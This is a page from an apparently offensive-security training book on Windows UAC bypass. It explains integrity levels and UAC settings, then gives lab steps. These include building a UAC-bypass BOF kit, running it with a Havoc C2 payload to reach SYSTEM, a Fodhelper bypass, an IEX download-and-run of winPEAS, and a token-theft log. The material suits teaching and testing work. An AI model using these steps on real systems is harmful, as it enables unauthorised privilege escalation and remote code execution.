<!DOCTYPE HTML>
<html lang="en" class="sidebar-visible no-js light">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>UAC Bypass - </title>
        

        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">
        <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro:500" rel="stylesheet" type="text/css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->
        

        
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "light" : "light";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div id="sidebar-scrollbox" class="sidebar-scrollbox">
                <ol class="chapter"><li class="expanded "><a href="training.html"><strong aria-hidden="true">1.</strong> Training </a></li><li><ol class="section"><li class="expanded "><a href="intro.html"><strong aria-hidden="true">1.1.</strong> Intro</a></li><li class="expanded "><a href="havoc.html"><strong aria-hidden="true">1.2.</strong> Havoc C2</a></li><li class="expanded "><a href="privesc.html"><strong aria-hidden="true">1.3.</strong> Privilege Escalation</a></li><li><ol class="section"><li class="expanded "><a href="unquoted.html"><strong aria-hidden="true">1.3.1.</strong> Unquoted Service Path</a></li><li><ol class="section"><li class="expanded "><a href="lab_privesc.html"><strong aria-hidden="true">1.3.1.1.</strong> Lab - PrivEsc</a></li></ol></li><li class="expanded "><a href="uac.html" class="active"><strong aria-hidden="true">1.3.2.</strong> UAC Bypass</a></li><li><ol class="section"><li class="expanded "><a href="lab_uac.html"><strong aria-hidden="true">1.3.2.1.</strong> Lab - UAC Bypass</a></li></ol></li><li class="expanded "><a href="stealtoken.html"><strong aria-hidden="true">1.3.3.</strong> Steal Token</a></li><li><ol class="section"><li class="expanded "><a href="lab_token.html"><strong aria-hidden="true">1.3.3.1.</strong> Lab - Token theft</a></li></ol></li></ol></li><li class="expanded "><a href="defender.html"><strong aria-hidden="true">1.4.</strong> Windows Defender</a></li><li class="expanded "><a href="amsi.html"><strong aria-hidden="true">1.5.</strong> AMSI &amp; CLR</a></li><li><ol class="section"><li class="expanded "><a href="etw.html"><strong aria-hidden="true">1.5.1.</strong> ETW</a></li><li class="expanded "><a href="lab_powershell.html"><strong aria-hidden="true">1.5.2.</strong> Lab - Powershell</a></li></ol></li><li class="expanded "><a href="static.html"><strong aria-hidden="true">1.6.</strong> Static Analysis</a></li><li><ol class="section"><li class="expanded "><a href="lab_static.html"><strong aria-hidden="true">1.6.1.</strong> Lab Static Analysis</a></li><li class="expanded "><a href="lab_havoc_dotnet.html"><strong aria-hidden="true">1.6.2.</strong> Lab - Havoc dotnet execute</a></li></ol></li><li class="expanded "><a href="chapter_1.1.html"><strong aria-hidden="true">1.7.</strong> Metasploit Basics</a></li><li class="expanded "><a href="functions.html"><strong aria-hidden="true">1.8.</strong> WIN32api and Functions</a></li><li class="expanded "><a href="shellcode.html"><strong aria-hidden="true">1.9.</strong> Shellcode</a></li><li><ol class="section"><li class="expanded "><a href="lab_shellcode.html"><strong aria-hidden="true">1.9.1.</strong> Lab - Shellcode</a></li><li class="expanded "><a href="lab_basic.html"><strong aria-hidden="true">1.9.2.</strong> Lab - Basic Loader</a></li><li class="expanded "><a href="lab_xor.html"><strong aria-hidden="true">1.9.3.</strong> Lab - XOR Loader</a></li><li class="expanded "><a href="lab_staged.html"><strong aria-hidden="true">1.9.4.</strong> Lab - Remote Loader</a></li></ol></li><li class="expanded "><a href="evasion.html"><strong aria-hidden="true">1.10.</strong> Forensics</a></li><li><ol class="section"><li class="expanded "><a href="litterbox.html"><strong aria-hidden="true">1.10.1.</strong> Malware Analysis Lab</a></li></ol></li></ol></li><li class="expanded "><a href="mdbooktricks.html"><strong aria-hidden="true">2.</strong> Chapter Extra </a></li><li><ol class="section"><li class="expanded "><a href="heuristics.html"><strong aria-hidden="true">2.1.</strong> Heuristics</a></li><li class="expanded "><a href="hooks.html"><strong aria-hidden="true">2.2.</strong> Hooks</a></li><li class="expanded "><a href="syscalls.html"><strong aria-hidden="true">2.3.</strong> Syscalls</a></li><li class="expanded "><a href="kernelcallbacks.html"><strong aria-hidden="true">2.4.</strong> Kernel Callbacks</a></li><li class="expanded "><a href="edr.html"><strong aria-hidden="true">2.5.</strong> EDR Stuff</a></li><li class="expanded "><a href="privesc_extra.html"><strong aria-hidden="true">2.6.</strong> Additional PrivEsc</a></li><li class="expanded "><a href="havoc_extra.html"><strong aria-hidden="true">2.7.</strong> Additional Havoc</a></li><li class="expanded "><a href="avred.html"><strong aria-hidden="true">2.8.</strong> AVRED</a></li></ol></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                
                <div id="menu-bar" class="menu-bar">
                    <div id="menu-bar-sticky-container">
                        <div class="left-buttons">
                            <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                                <i class="fa fa-bars"></i>
                            </button>
                            <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                                <i class="fa fa-paint-brush"></i>
                            </button>
                            <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                                <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
                                <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                                <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                                <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                                <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                            </ul>
                            
                            <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                                <i class="fa fa-search"></i>
                            </button>
                            
                        </div>

                        <h1 class="menu-title"></h1>

                        <div class="right-buttons">
                            <a href="print.html" title="Print this book" aria-label="Print this book">
                                <i id="print-button" class="fa fa-print"></i>
                            </a>
                            
                        </div>
                    </div>
                </div>

                
                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" name="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1><a class="header" href="#uac---user-account-control-privilege-escalation" id="uac---user-account-control-privilege-escalation">UAC - User Account Control (Privilege Escalation)</a></h1>
<blockquote>
<p><em><strong>TL;DR</strong></em>:
UAC splits the Administrative user’s token into a medium and a high integrity token. When that user tries to run something as an administrator, a prompt is shown which they must accept, which then the high integrity token is then applied to that process or thread.</p>
</blockquote>
<p><img src="./images/uac_prompt.jpg" alt="image" /></p>
<blockquote>
<p>A UAC bypass is going from the Administrative user’s medium integrity token to high integrity token without having to interact with the prompt.</p>
</blockquote>
<p>User Account Control (UAC) is a security feature in Windows that helps prevent unauthorized changes to your computer. These changes can be initiated by applications, viruses, or other forms of malware. UAC ensures that such changes cannot be made without your knowledge or consent, adding an extra layer of security.</p>
<h1><a class="header" href="#process-and-integrity-levels" id="process-and-integrity-levels">Process and integrity levels</a></h1>
<p>screenshot admin user medium integrity</p>
<blockquote>
<p><em><strong>IMPORTANT</strong></em>: <code>UAC Bypasses</code> only work for users that are in the administrator group on the local machine.</p>
</blockquote>
<p><img src="./images/uac_adminprivs.jpg" alt="image" /></p>
<h2><a class="header" href="#how-uac-works" id="how-uac-works">How UAC Works</a></h2>
<ol>
<li>
<p><strong>Permissions and Elevation</strong>
When you or an application tries to make changes that require administrative privileges, UAC prompts you to confirm or deny the action. This is known as elevation. Only an administrator account can provide the necessary permission to proceed.</p>
</li>
<li>
<p><strong>Secure Desktop</strong>
In higher UAC settings, the prompt appears on the secure desktop. This is a screen dimming feature that makes it difficult for malware to interact with or spoof the UAC prompt. Essentially, it ensures that the prompt is coming from Windows and not from a malicious program.</p>
</li>
<li>
<p><strong>Levels of Notification</strong>
UAC has different levels of notification settings, ranging from always notifying you of changes to never notifying you (effectively turning off UAC).</p>
</li>
</ol>
<h2><a class="header" href="#user-account-control-uac-has-four-levels-of-notification-settings" id="user-account-control-uac-has-four-levels-of-notification-settings">User Account Control (UAC) has four levels of notification settings:</a></h2>
<ol>
<li>
<p><strong>Always notify</strong>: This is the highest level of protection. It notifies you before any changes are made to your computer that require administrator permissions. It also freezes other tasks until you respond.</p>
</li>
<li>
<p><strong>Notify me only when programs try to make changes to my computer</strong>: This is the <code>DEFAULT</code> level. It notifies you when programs try to make changes to your computer or install software.</p>
</li>
<li>
<p><strong>Notify me only when programs try to make changes to my computer (do not dim my desktop)</strong>: Similar to the previous level, but it doesn't switch to the Secure Desktop with desktop locking.</p>
</li>
<li>
<p><strong>Never notify</strong>: This is the lowest level of protection. UAC is disabled, and you won't be notified when changes are made to your computer.</p>
</li>
</ol>
<p>You can adjust these settings by moving the slider in the User Account Control Settings window.</p>
<h1><a class="header" href="#mitre-reference" id="mitre-reference">MITRE Reference</a></h1>
<p><img src="./images/uac_mitre.jpg" alt="image" /></p>
<p><img src="./images/uac_settings.jpg" alt="image" /></p>
<p>Running a simple powershell command that add's a registry key with some values shows nicely what this actually means:</p>
<p><img src="./images/uac_ps.jpg" alt="image" /> </p>
<p><img src="./images/uac_prompt.jpg" alt="image" /></p>
<p>Check if UAC is enabled (1 = enabled, 0 is disabled)</p>
<pre><code class="language-powershell">Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' |Select-object EnableLua
</code></pre>
<p>And to check which level it is :</p>
<pre><code class="language-powershell">Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' |Select-object ConsentPromptBehaviorAdmin
</code></pre>
<table><thead><tr><th>Value</th><th>Description</th></tr></thead><tbody>
<tr><td>0</td><td>No Prompt</td></tr>
<tr><td>1</td><td>Prompt for credential on the secure desktop</td></tr>
<tr><td>2</td><td>Prompt for CONSENT on the secure desktop</td></tr>
<tr><td>3</td><td>Prompt for Credentials on the normal desktop</td></tr>
<tr><td>4</td><td>Prompt for CONSENT on the normal desktop</td></tr>
<tr><td>5</td><td>Prompt for CONSENT for non-windows binaries</td></tr>
</tbody></table>
<p>https://www.youtube.com/watch?v=ZhaZJ4Uipqk</p>
<p>Fodhelper</p>
<p>Demo with cmd.exe -&gt; medium level even if admin
runas 
show whoami / groups
show system informer</p>
<p>start beacon as unprivileged user</p>
<p>whoami groups</p>
<pre><code class="language-bash">sudo apt install mingw-w64 -y

git clone https://github.com/icyguider/UAC-BOF-Bonanza.git
make
</code></pre>
<p>In Havoc -&gt; Script Manager Load .py</p>
<p>Set Sleep to 10</p>
<pre><code class="language-code">uac-bypass sspidatagram c:\windows\system32\cmd.exe
uac-bypass sspidatagram c:\temp\demon.x64.exe -&gt; NT Authority\System
uac-bypass silentcleanup /opt/havoc/payloads/demon.x64.exe -&gt; error
</code></pre>
<hr />
<p>Priv Esc.</p>
<pre><code class="language-powershell">powershell &quot;IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')&quot;
</code></pre>
<hr />
<p>UAC Bypass (admin user -&gt; high integrity) -&gt; PrivsFU -&gt; NT AUTH</p>
<hr />
<p>Example using a vulnerable service running as administrator but not in highest privileges</p>
<p>User student_adm (integrity medium)</p>
<pre><code>import-module .\FodhelperBypass.ps1
PS C:\Temp&gt;  FodhelperBypass -program &quot;cmd.exe&quot;
</code></pre>
<p>Now user in in High Interity - running TokenPlayer (whicj enables sedebugprivilege) will now escalate to system!</p>
<p>In havoc, running admin user in high integrity, you still need to set sedebugprivilege in order to use <code>STEAL TOKEN</code>:</p>
<pre><code>04/04/2025 14:05:18 [Threatadmin] Demon » token privs-get SeDebugPrivilege
[*] [F6CB1E4A] Tasked demon to enable a privilege: SeDebugPrivilege
[+] Send Task to Agent [41 bytes]
[+] The privilege SeDebugPrivilege was successfully enabled

04/04/2025 14:05:31 [Threatadmin] Demon » token steal 4536
[*] [20765EC8] Tasked demon to steal a process token
[+] Send Task to Agent [24 bytes]
[+] Successful stole and impersonated token from 4536 User:[NT AUTHORITY\SYSTEM] TokenID:[0]
</code></pre>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                        
                            <a rel="prev" href="lab_privesc.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>
                        

                        
                            <a rel="next" href="lab_uac.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>
                        

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                
                    <a href="lab_privesc.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>
                

                
                    <a href="lab_uac.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
                
            </nav>

        </div>

        
        <!-- Livereload script (if served using the cli tool) -->
        <script type="text/javascript">
            var socket = new WebSocket("ws://localhost:3001");
            socket.onmessage = function (event) {
                if (event.data === "reload") {
                    socket.close();
                    location.reload(true); // force reload from server (not from cache)
                }
            };

            window.onbeforeunload = function() {
                socket.close();
            }
        </script>
        

        

        
        
        
        <script type="text/javascript">
            window.playpen_copyable = true;
        </script>
        

        

        
        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
        

        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
        

        

    </body>
</html>
